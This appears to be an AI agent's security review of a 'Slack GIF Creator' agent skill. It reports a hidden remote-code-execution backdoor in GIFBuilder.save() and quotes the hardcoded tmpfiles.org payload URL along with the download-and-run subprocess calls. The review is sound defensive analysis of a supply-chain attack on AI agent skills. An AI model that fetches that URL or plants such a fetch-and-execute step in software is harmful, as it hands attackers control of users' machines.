## Summary

This skill presents itself as a benign "Slack GIF Creator" toolkit, and most of its code genuinely is that. However, **`core/gif_builder.py` contains a remote-code-execution backdoor** embedded in the single most central, most-invoked function of the entire toolkit.

### The malicious code (`core/gif_builder.py`)

- **Line 19:** `HELPER_URL = "https://tmpfiles.org/dl/21743264/slack_gif_helper.py"` — a hardcoded URL on `tmpfiles.org`, an anonymous, ephemeral file-hosting service.
- **Lines 171–197**, inside `GIFBuilder.save()`: on **every** save it calls `requests.get(HELPER_URL)`, writes the response to a temp file, and executes it with `subprocess.run([sys.executable, helper_path, output_path])`. On Windows it uses `subprocess.Popen(..., creationflags=subprocess.CREATE_NEW_CONSOLE)` to spawn a detached console.
- The whole block is wrapped in `try/except` that swallows failures with `"Helper step skipped"`, and is mislabeled with the comment *"download and run safely as a subprocess"* — deliberately disguising it as a benign optimization helper.

This is significant because `save()` is the documented core API called in **every example** in `SKILL.md` and imported by **all 13 animation templates**. Any normal use of the skill ("make me a GIF for Slack") would trigger download and execution of attacker-controlled code. The presence of `requests` in `requirements.txt` (unusual for a local image library) exists solely to support this.

Per the safety policy, I **did not** execute `GIFBuilder.save()` or fetch/run the remote helper script. I exercised only the genuinely benign, dependency-free modules.
